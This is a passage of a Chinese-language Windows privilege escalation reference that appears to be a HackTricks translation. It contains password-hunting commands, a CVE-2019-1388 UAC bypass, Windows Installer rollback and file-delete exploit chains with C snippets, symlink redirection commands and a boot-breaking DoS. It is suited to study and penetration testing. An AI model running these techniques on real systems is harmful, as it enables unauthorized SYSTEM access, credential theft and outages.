![浏览器历史记录 - COM DLL 覆盖：在此注册表的 CLSID 项下，可以找到子注册表项 InProcServer32，其中包含一个指向 DLL 的默认值，以及一个值……](<../../images/image (729).png>)

基本上，如果你能**覆盖任何即将执行的 DLL**，而该 DLL 将由其他用户执行，就可以**提升权限**。

若要了解攻击者如何将 COM Hijacking 用作持久化机制，请查看：

{{#ref}}
com-hijacking.md
{{#endref}}

### **在文件和注册表中搜索通用密码**

**搜索文件内容**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**搜索指定文件名的文件**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**在注册表中搜索键名和密码**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### 搜索密码的工具

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **是一个 msf** 插件，我创建了这个插件，用于**自动执行每个会在受害者系统中搜索凭据的 Metasploit POST 模块**。\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) 会自动搜索本页面提到的所有包含密码的文件。\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) 是另一个从系统中提取密码的优秀工具。

工具 [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) 会搜索多个工具以明文保存的 **sessions**、**用户名**和**密码**（PuTTY、WinSCP、FileZilla、SuperPuTTY 和 RDP）

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

假设**一个以 SYSTEM 身份运行的进程使用完全访问权限打开了一个新进程**（`OpenProcess()`）。同一进程**还创建了一个低权限进程**（`CreateProcess()`），**并让该进程继承主进程的所有已打开句柄**。\
然后，如果你对这个低权限进程拥有**完全访问权限**，就可以获取它指向通过 `OpenProcess()` 创建的特权进程的**已打开句柄**，并**注入 shellcode**。\
[阅读此示例，了解**如何检测并利用此漏洞**。](leaked-handle-exploitation.md)\
[阅读[**另一篇文章**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/)，了解如何更全面地测试和滥用进程与线程继承的、具有不同权限级别（不只是完全访问权限）的已打开句柄。](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

共享内存段（称为**管道**）可用于进程间通信和数据传输。

Windows 提供了名为 **Named Pipes** 的功能，让互不相关的进程能够共享数据，甚至可以跨不同网络共享。这类似于客户端/服务器架构，角色分别称为**命名管道服务器**和**命名管道客户端**。

当**客户端**通过管道发送数据时，建立该管道的**服务器**可以**冒充**该**客户端**，前提是它拥有所需的 **SeImpersonate** 权限。找到一个通过你可以模拟的管道进行通信的**特权进程**，就有机会在该进程与所建立的管道交互后，通过冒充它的身份来**提升权限**。有关如何执行此类攻击的说明，请参阅[**此处**](named-pipe-client-impersonation.md)和[**此处**](#from-high-integrity-to-system)的指南。

此外，以下工具可以**使用类似 Burp 的工具拦截命名管道通信：**[**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept)；此工具可以列出并查看所有管道，以寻找权限提升机会：[**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv 远程 DWORD 写入到 RCE

Telephony 服务（TapiSrv）在服务器模式下会公开 `\\pipe\\tapsrv`（MS-TRP）。经过身份验证的远程客户端可以滥用基于 mailslot 的异步事件路径，将 `ClientAttach` 转变为对 `NETWORK SERVICE` 可写的任意现有文件进行**4 字节写入**，然后获取 Telephony 管理员权限，并以该服务的身份加载任意 DLL。完整流程如下：

- 将 `ClientAttach` 的 `pszDomainUser` 设置为一个可写的现有路径 → 服务通过 `CreateFileW(..., OPEN_EXISTING)` 打开该路径，并将其用于异步事件写入。
- 每个事件都会将 `Initialize` 中由攻击者控制的 `InitContext` 写入该句柄。使用 `LRegisterRequestRecipient`（`Req_Func 61`）注册一个 line app，触发 `TRequestMakeCall`（`Req_Func 121`），通过 `GetAsyncEvents`（`Req_Func 0`）获取事件，然后注销并关闭服务，以重复进行确定性写入。
- 将自己添加到 `C:\Windows\TAPI\tsec.ini` 中的 `[TapiAdministrators]`，重新连接，然后使用任意 DLL 路径调用 `GetUIDllName`，即可让 `NETWORK SERVICE` 执行 `TSPI_providerUIIdentify`。

更多详情：

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## 其他

### Windows 中可能执行内容的文件扩展名

请查看 **[https://filesec.io/](https://filesec.io/)** 页面。

### 通过 Markdown 渲染器滥用协议处理程序 / ShellExecute

转交给 `ShellExecuteExW` 的可点击 Markdown 链接可能触发危险的 URI 处理程序（`file:`、`ms-appinstaller:` 或任何已注册的 scheme），并以当前用户身份执行攻击者控制的文件。请参阅：

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **监控命令行中的密码**

当你以某个用户的身份获取 shell 时，可能会有计划任务或其他进程正在运行，并且**在命令行中传递凭据**。以下脚本每两秒捕获一次进程命令行，并将当前状态与之前的状态进行比较，输出所有差异。

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## 从进程中窃取密码

## 从低权限用户提升至 NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

如果你可以访问图形界面（通过控制台或 RDP），且已启用 UAC，那么在某些版本的 Microsoft Windows 中，非特权用户可以运行终端或其他进程，并使其以“NT\AUTHORITY SYSTEM”身份运行。

这使你可以利用同一个漏洞同时提升权限并绕过 UAC。此外，无需安装任何内容，而且过程中使用的 binary 由 Microsoft 签名并发布。

受影响的系统包括：

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

要利用此漏洞，需要执行以下步骤：

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

你可以在以下 GitHub 仓库中找到所有必要文件和信息：

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## 从 Administrator Medium 提升到 High Integrity Level / UAC Bypass

阅读此文以**了解 Integrity Levels**：


{{#ref}}
integrity-levels.md
{{#endref}}

然后**阅读此文以了解 UAC 和 UAC bypasses：**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## 将 Upload Directory Junctions 指向 Served Root

应用程序可能会创建一个可预测的上传子目录，将调用者提供的文件名写入其中，然后处理该文件。如果低权限用户可以在服务器端写入之前删除该子目录，并将其替换为 NTFS junction，那么写入操作可能会沿着 junction 进入 web-served 目录。如果服务器会执行该文件类型，放置在该目录中的脚本便可能以 web-service 身份运行。这是应用程序特定的 arbitrary-write 边界；仅有可写的上传目录或现存的 junction 并不能证明此问题存在。

检查上传处理程序中确切的路径构造和执行时序、用户对该子目录实际拥有的删除/创建权限、目标目录的有效 ACL、写入程序是否会跟随 reparse points，以及 web server 是否会在目标目录中执行文件。分别确认写入程序和 web server 的进程身份。被动清点可以显示目录 ACL 和 reparse 元数据，但无法确定处理程序的行为或未来是否会发生 junction 替换。如果执行落在服务帐户下，在考虑任何单独的 token-privilege 路径之前，先检查**实际进程 token**。

## 由 WNF 触发的特权计划任务清理

即使计划任务拒绝手动执行，也仍可能存在可由非特权用户触发的入口。审计特权任务时，导出其 XML，并检查**所有**触发器以及任务 DACL、主体和操作。特别是，`WnfStateChangeTrigger` 会指定一个 Windows Notification Facility (WNF) 状态；如果当前用户有权向该可保护状态发布更新，即使 `<AllowStartOnDemand>false</AllowStartOnDemand>`，用户仍可间接以任务配置的身份启动该任务。<sup>[[43]](#references)</sup>

例如，Recall 的 `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` 任务以 SYSTEM 身份运行，允许标准用户更新 WNF 状态 `7508BCA32C079E41`，随后检查 `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}`，即使 Recall 已禁用也是如此。<sup>[[43]](#references)</sup>

```powershell
schtasks /query /tn "<TASK>" /xml > task.xml
Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
```

要测试可达性，请从 `ntdll.dll` 解析 `ZwUpdateWnfStateData`，针对这个八字节状态名称提交一次空更新，并将返回状态与任务的上次运行数据或 Procmon 活动关联起来。下面的精简探测使用了 Recall 任务示例中的字节序列；请替换为针对待测试任务导出的字节。<sup>[[43]](#references)</sup>

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (WINAPI *UpdateWnf)(PVOID,PVOID,ULONG,PVOID,PVOID,PVOID,ULONG);
int main(void) {
    unsigned char stateName[8] = {0x75,0x08,0xBC,0xA3,0x2C,0x07,0x9e,0x41};
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    UpdateWnf update = (UpdateWnf)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    if (!update) return 1;
    return update(stateName, NULL, 0, NULL, NULL, NULL, 0) < 0;
}
```

### 将递归清理转化为特权删除

关键原语不只是触发器本身，而是一个接受攻击者控制目录的特权清理例程。追踪从枚举到最终修改的整个操作：profile/session 发现、由通配符选中的子项、`SHCreateItemFromParsingName` 和 `IFileOperation::DeleteItem`，都是强烈迹象，表明先前检查过的路径名之后会被递归遍历。如果后代项不是相对于受信任的目录句柄打开并在删除前验证，攻击者就能在枚举和使用之间改变路径解析结果。<sup>[[43]](#references)</sup>

将 WNF 触发器与下文所述的 [oplock、junction 和 Object Manager symlink 替换](#from-folder-contents-delete-to-system-eop)结合：oplock 会在清理程序选中合法子项后将其暂停，同时替换可写祖先目录；恢复后，特权删除操作会经由 `\RPC Control` 解析到受保护目标。在 Recall 攻击链中，这使 SYSTEM 删除了 `C:\Config.Msi`，满足了文档所述 MSI rollback 技术的要求。<sup>[[31]](#references)[[43]](#references)</sup>

### 嵌套后代项可绕过浅层 reparse point 修复

只验证攻击者控制的根目录及其直接子项，并不能保护基于路径名的递归删除。保留这些经过检查的对象不变，将 junction/oplock 替换移至它们下面的另一个子项；`IFileOperation::DeleteItem` 最终会访问未经验证的后代项，并跟随其新目标。CVE-2026-20941 正是由这类不完整修复导致：首个 Recall 补丁验证了 `UKP` 和 GUID 格式的目录，却保留了原有的递归删除操作。<sup>[[43]](#references)</sup>

安全做法是：相对于已受信任的目录句柄打开**每一个后代项**，获取并验证最终解析出的路径/对象，然后对已验证的句柄应用删除 disposition。不要只验证路径前缀，之后又回到基于路径的递归删除。审查补丁时，还要检查实际调用位置的结构：本例中，对 `NtCreateFile` 处 `OBJECT_ATTRIBUTES` 的运行时检查显示，`RootDirectory` 非空，且名称为相对路径 `{GUID}\\secure_file.lock`，这推翻了反编译器误导性的输出；后者暗示存在第二个 `FILE_DELETE_ON_CLOSE` 原语。<sup>[[43]](#references)</sup>

## 从任意文件夹删除/移动/重命名到 SYSTEM EoP

此技术见[**这篇博文**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)，exploit 代码[**见此处**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)。<sup>[[31]](#references)[[32]](#references)</sup>

该攻击基本上是利用 Windows Installer 的 rollback 功能，在卸载过程中用恶意文件替换合法文件。为此，攻击者需要创建一个**恶意 MSI 安装程序**，用来劫持 `C:\Config.Msi` 文件夹。之后，Windows Installer 会在卸载其他 MSI 软件包时使用该文件夹存储 rollback 文件；攻击者会预先篡改这些 rollback 文件，使其包含恶意 payload。

### Windows Installer COM 清理路径注入（CVE-2025-27727）

低权限客户端可以通过 `CMsiConfigurationManager` COM 对象（CLSID/IID `{000C101C-0000-0000-C000-000000000046}`）访问 SYSTEM 的 `msiexec.exe` 服务。逆向分析发现，相关的 `IMsiServer` 调用为 vtable 偏移 `0xA0` 处的 `MsiBeginTransactionW`、`0xC8` 处的 `SetEEUIDirectoryAndFilter`，以及 `0x50` 处的 `CleanupTempPackages`。这些名称和偏移是逆向分析得出的，可能因 build 而异。<sup>[[41]](#references)</sup>

对于非管理员用户，`SetEEUIDirectoryAndFilter` 只会在打开所提供的路径时模拟调用者，并使用 `DELETE`、`FILE_FLAG_BACKUP_SEMANTICS` 和 `FILE_FLAG_OPEN_REPARSE_POINT`。这证明调用者有权删除该目录，并且不会跟随 reparse point；但它**不会**将经过检查的文件对象绑定到后续清理操作，也不能证明该对象由 Windows Installer 创建。<sup>[[41]](#references)</sup>

调用 `MsiBeginTransactionW` 后，`SetEEUIDirectoryAndFilter` 会将该路径安排为文件夹，不受调用者所传 filter 参数的影响。服务会在 `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages` 下写入一个命名的 `REG_DWORD` 值：值名称是调用者控制的路径，数据 `0x00000002` 是文件夹标志。随后，`CleanupTempPackages(NULL, FALSE)` 会直接进入清理流程。其提权后的 worker 会枚举注册表值，并将文件夹项传给递归执行的 `FDeleteFolder`，而不检查路径来源。如果常规删除失败，代码还会调用 `LockdownPath`、清除文件属性并重试。<sup>[[41]](#references)</sup>

从 `msi.dll` 中还原出的最简调用序列如下：<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

有用的原语是路径复用，而不是 junction 重定向。注册一个攻击者创建的 `C:\Config.Msi`，将其删除，然后让 Windows Installer 稍后使用相同路径名重新创建该目录，并在其中存放受保护的回滚数据。清理操作信任过期的 `TempPackages` 名称，并以 SYSTEM 身份删除新目录。由于不需要 reparse point，这就绕过了 `FILE_FLAG_OPEN_REPARSE_POINT` 和重定向信任缓解措施所要建立的边界。<sup>[[41]](#references)</sup>

此删除原语可用于下方的回滚链：保留独立的 `Installer\Folders` 记录，删除受保护的 `C:\Config.Msi`，再用 NULL DACL 重新创建它，并在安装程序强化 DACL 之前保留一个具有 `WRITE_DAC` 权限的句柄。预先打开的句柄可以通过 `NtSetSecurityObject` 恢复宽松的 DACL，之后便能在回滚继续之前替换生成的 `.rbs`。<sup>[[41]](#references)</sup>

Microsoft 修复了此路径：启用新的功能门控后，阻止 `CMsiTransaction::SetEEUIDirectoryAndFilter` 调用 `ScheduleFileOrFolderDelete`。COM 调用仍可能返回成功，但它不再会将攻击者控制的路径加入 `TempPackages`。请安装 2025 年 4 月的 Windows 安全更新，不要用方法返回成功与否来判断是否已修复。<sup>[[41]](#references)[[42]](#references)</sup>

该技术总结如下：

1. **阶段 1 – 为劫持做准备（让 `C:\Config.Msi` 保持为空）**

- 步骤 1：安装 MSI
    - 创建一个 `.msi`，在可写文件夹（`TARGETDIR`）中安装无害文件（例如 `dummy.txt`）。
    - 将安装程序标记为 **“UAC Compliant”**，使**非管理员用户**也能运行它。
    - 安装后，保持该文件的一个**句柄**处于打开状态。

- 步骤 2：开始卸载
    - 卸载同一个 `.msi`。
    - 卸载过程开始将文件移至 `C:\Config.Msi`，并将其重命名为 `.rbf` 文件（回滚备份）。
    - 使用 `GetFinalPathNameByHandle` **轮询打开的文件句柄**，检测文件何时变为 `C:\Config.Msi\<random>.rbf`。

- 步骤 3：自定义同步
    - `.msi` 包含一个**自定义卸载操作（`SyncOnRbfWritten`）**，用于：
        - 在写入 `.rbf` 后发出信号。
        - 然后等待另一个事件，再继续卸载。

- 步骤 4：阻止删除 `.rbf`
    - 收到信号后，在**不指定 `FILE_SHARE_DELETE` 的情况下打开 `.rbf` 文件**——这会**阻止文件被删除**。
    - 然后发回信号，让卸载继续完成。
    - Windows Installer 无法删除 `.rbf`；由于不能删除所有内容，**`C:\Config.Msi` 不会被移除**。

- 步骤 5：手动删除 `.rbf`
    - 你（攻击者）手动删除 `.rbf` 文件。
    - 现在，**`C:\Config.Msi` 为空**，可以进行劫持。

> 此时，**触发 SYSTEM 级任意文件夹删除漏洞**，删除 `C:\Config.Msi`。

2. **阶段 2 – 用恶意脚本替换回滚脚本**

- 步骤 6：使用弱 ACL 重新创建 `C:\Config.Msi`
    - 自行重新创建 `C:\Config.Msi` 文件夹。
    - 设置**弱 DACL**（例如 Everyone:F），并**保持一个具有 `WRITE_DAC` 权限的句柄处于打开状态**。

- 步骤 7：运行另一次安装
    - 再次安装 `.msi`，并设置：
        - `TARGETDIR`：可写位置。
        - `ERROROUT`：会触发强制失败的变量。
    - 这次安装将再次用于触发**回滚**，届时会读取 `.rbs` 和 `.rbf`。

- 步骤 8：监控 `.rbs`
    - 使用 `ReadDirectoryChangesW` 监控 `C:\Config.Msi`，直到出现新的 `.rbs`。
    - 记录其文件名。

- 步骤 9：在回滚前同步
    - `.msi` 包含一个**自定义安装操作（`SyncBeforeRollback`）**，用于：
        - 在创建 `.rbs` 时发出事件信号。
        - 然后等待，再继续执行。

- 步骤 10：重新应用弱 ACL
    - 收到 `.rbs created` 事件后：
        - Windows Installer 会对 `C:\Config.Msi` **重新应用强 ACL**。
        - 但由于你仍持有一个具有 `WRITE_DAC` 权限的句柄，因此可以**再次应用弱 ACL**。

> ACL **只会在打开句柄时强制执行**，所以你仍然可以写入该文件夹。

- 步骤 11：放入伪造的 `.rbs` 和 `.rbf`
    - 覆盖 `.rbs` 文件，将其替换为一个**伪造的回滚脚本**，指示 Windows 执行以下操作：
        - 将你的 `.rbf` 文件（恶意 DLL）还原到**特权位置**（例如 `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`）。
    - 放入伪造的 `.rbf`，其中包含一个**恶意的 SYSTEM 级 payload DLL**。

- 步骤 12：触发回滚
    - 发出同步事件信号，让安装程序继续运行。
    - 安装程序配置了一个**类型 19 的自定义操作（`ErrorOut`）**，会在已知位置故意使安装失败。
    - 这会导致**回滚开始**。

- 步骤 13：SYSTEM 安装你的 DLL
    - Windows Installer：
        - 读取你的恶意 `.rbs`。
        - 将你的 `.rbf` DLL 复制到目标位置。
    - 现在，你的**恶意 DLL 已位于由 SYSTEM 加载的路径中**。

- 最后一步：执行 SYSTEM 代码
    - 运行一个会加载被你劫持的 DLL 的可信**自动提权二进制文件**（例如 `osk.exe`）。
    - **搞定**：你的代码将以 **SYSTEM** 身份执行。


### 从任意文件删除/移动/重命名到 SYSTEM EoP

主要的 MSI 回滚技术（上一种）假设你能够删除**整个文件夹**（例如 `C:\Config.Msi`）。但如果你的漏洞只允许**任意文件删除**呢？

你可以利用 **NTFS 内部机制**：每个文件夹都有一个隐藏的备用数据流，名为：

```
C:\SomeFolder::$INDEX_ALLOCATION
```

此数据流存储文件夹的**索引元数据**。

因此，如果你**删除文件夹的 `::$INDEX_ALLOCATION` 数据流**，NTFS 就会从文件系统中**移除整个文件夹**。

你可以使用标准的文件删除 API 来实现：
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> 尽管你调用的是 *file* 删除 API，但它**会删除文件夹本身**。

### 从删除文件夹内容到 SYSTEM EoP
如果你的原语无法删除任意文件/文件夹，但**可以删除攻击者可控文件夹中的*内容***，该怎么办？

1. 步骤 1：设置诱饵文件夹和文件
- 创建：`C:\temp\folder1`
- 在其中创建：`C:\temp\folder1\file1.txt`

2. 步骤 2：在 `file1.txt` 上设置一个 **oplock**
- 当特权进程尝试删除 `file1.txt` 时，oplock 会**暂停执行**。

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Step 3：触发 SYSTEM 进程（例如 `SilentCleanup`）
- 此进程会扫描文件夹（例如 `%TEMP%`），并尝试删除其中的内容。
- 当它到达 `file1.txt` 时，**oplock 会触发**，并将控制权交给你的 callback。

4. Step 4：在 oplock callback 中——重定向删除操作

- Option A：将 `file1.txt` 移到其他位置
    - 这样可以清空 `folder1`，同时不会破坏 oplock。
    - 不要直接删除 `file1.txt`——那会导致 oplock 提前释放。

- Option B：将 `folder1` 转换为 **junction**：

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- 选项 C：在 `\RPC Control` 中创建一个 **symlink**：
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> 这针对的是存储文件夹元数据的 NTFS 内部流——删除它就会删除该文件夹。

5. 步骤 5：释放 oplock
- SYSTEM 进程继续运行，并尝试删除 `file1.txt`。
- 但现在，由于 junction + symlink，它实际上删除的是：
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**结果**：`C:\Config.Msi` 已被 SYSTEM 删除。

### 从创建任意文件夹到永久 DoS

利用一个原语，让你能够**以 SYSTEM/admin 身份创建任意文件夹**——即使**你无法写入文件**或**设置弱权限**。

创建一个**文件夹**（不是文件），并使用某个**关键 Windows 驱动程序**的名称，例如：
```
C:\Windows\System32\cng.sys
```

- 此路径通常对应 `cng.sys` 内核模式驱动程序。
- 如果你**预先将其创建为文件夹**，Windows 在启动时将无法加载实际驱动程序。
- 随后，Windows 会在启动期间尝试加载 `cng.sys`。
- 它发现该路径是文件夹，**无法解析实际驱动程序**，并且**崩溃或停止启动**。
- **没有备用方案**，也**无法恢复**，除非进行外部干预（例如启动修复或访问磁盘）。

### 利用特权日志/备份路径 + OM symlinks 实现任意文件覆盖 / 启动 DoS

当**特权服务**将日志/导出文件写入从**可写配置文件**读取的路径时，可以通过 **Object Manager symlinks + NTFS mount points** 重定向该路径，将特权写入操作变成任意文件覆盖（即使**没有** SeCreateSymbolicLinkPrivilege 也可以）。<sup>[[15]](#references)</sup>

**要求**
- 存储目标路径的配置文件可由攻击者写入（例如 `%ProgramData%\...\.ini`）。
- 能够创建指向 `\RPC Control` 的 mount point 和 OM file symlink（James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)）。<sup>[[16]](#references)[[17]](#references)</sup>
- 有一个会写入该路径的特权操作（日志、导出、报告）。

**示例链**
1. 读取配置文件，获取特权日志目标路径，例如 `C:\ProgramData\ICONICS\IcoSetup64.ini` 中的 `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt`。
2. 无需管理员权限即可重定向该路径：
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. 等待特权组件写入日志（例如，管理员触发“发送测试短信”）。现在写入的数据会落到 `C:\Windows\System32\cng.sys`。
4. 检查被覆盖的目标（使用 hex/PE parser）以确认其已损坏；重启会强制 Windows 加载被篡改的驱动程序路径 → **boot loop DoS**。这也适用于任何特权服务会以写入方式打开的受保护文件。

> `cng.sys` 通常从 `C:\Windows\System32\drivers\cng.sys` 加载，但如果 `C:\Windows\System32\cng.sys` 中存在一个副本，系统可能会优先尝试加载它，因此它是一个可靠的 DoS 数据接收目标。



## **从 High Integrity 到 System**

### **新建服务**

如果你已经在 High Integrity 进程中运行，那么只需**创建并执行一个新服务**，就能轻松实现**提升到 SYSTEM**：

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> 创建服务二进制文件时，请确保它是有效的服务，或者该二进制文件能快速执行必要操作，因为如果它不是有效服务，将在 20 秒后被终止。

### AlwaysInstallElevated

在 High Integrity 进程中，你可以尝试**启用 AlwaysInstallElevated 注册表项**，并使用 _**.msi**_ wrapper **安装**一个反向 shell。\
[有关涉及的注册表项以及如何安装 _.msi_ 软件包的更多信息，请点击这里。](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**你可以**[**在这里找到代码**](seimpersonate-from-high-to-system.md)**。**

### From SeDebug + SeImpersonate to Full Token privileges

如果你拥有这些 token 权限（你可能会在一个已经具有 High Integrity 的进程中发现它们），就可以利用 SeDebug 权限**打开几乎任何进程**（受保护的进程除外），**复制该进程的 token**，并使用该 token 创建一个**任意进程**。\
此技术通常会**选择一个以 SYSTEM 身份运行且拥有全部 token 权限的进程**（_是的，你也可能找到不具备全部 token 权限的 SYSTEM 进程_）。\
**你可以在这里找到**[**执行该技术的代码示例**](sedebug-+-seimpersonate-copy-token.md)**。**

### **Named Pipes**

meterpreter 会在 `getsystem` 中使用此技术进行提权。该技术的做法是**创建一个 pipe，然后创建/滥用一个服务来向该 pipe 写入内容**。随后，使用 **`SeImpersonate`** 权限创建 pipe 的**服务器**就能**模拟 pipe 客户端**（即服务）的 token，从而获得 SYSTEM 权限。\
如果你想[**进一步了解命名管道，请阅读这里**](#named-pipe-client-impersonation)。\
如果你想阅读[**如何使用命名管道从 high integrity 提权到 System 的示例，请阅读这里**](from-high-integrity-to-system-with-name-pipes.md)。

### Dll Hijacking

如果你成功**劫持了**以 **SYSTEM** 身份运行的**进程**所**加载**的 dll，就能以该进程的权限执行任意代码。因此，Dll Hijacking 也适用于此类提权；此外，从 high integrity 进程进行此操作要**容易得多**，因为它对用于加载 dll 的文件夹拥有**写入权限**。\
**你可以**[**在这里了解更多关于 Dll hijacking 的信息**](dll-hijacking/index.html)**。**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**阅读：**[**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[静态 impacket 二进制文件](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**用于查找 Windows 本地提权途径的最佳工具：**[**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- 检查错误配置和敏感文件（**[**在这里查看**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。已检测到。**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- 检查一些可能的错误配置并收集信息（**[**在这里查看**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- 检查错误配置**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- 提取 PuTTY、WinSCP、SuperPuTTY、FileZilla 和 RDP 保存的会话信息。在本地使用 -Thorough。**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- 从 Credential Manager 提取凭据。已检测到。**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- 在域中喷洒收集到的密码**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh 是一款 PowerShell ADIDNS/LLMNR/mDNS 欺骗和中间人工具。**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Windows 基础提权枚举**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- 搜索已知的提权漏洞（已弃用，改用 Watson）\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- 本地检查 **（需要管理员权限）**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- 搜索已知的提权漏洞（需要使用 VisualStudio 编译）（[**预编译版本**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- 枚举主机以查找错误配置（更偏向于信息收集工具，而非提权工具）（需要编译）**（**[**预编译版本**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**）**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 从大量软件中提取凭据（github 上有预编译的 exe）**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp 的 C# 移植版**\
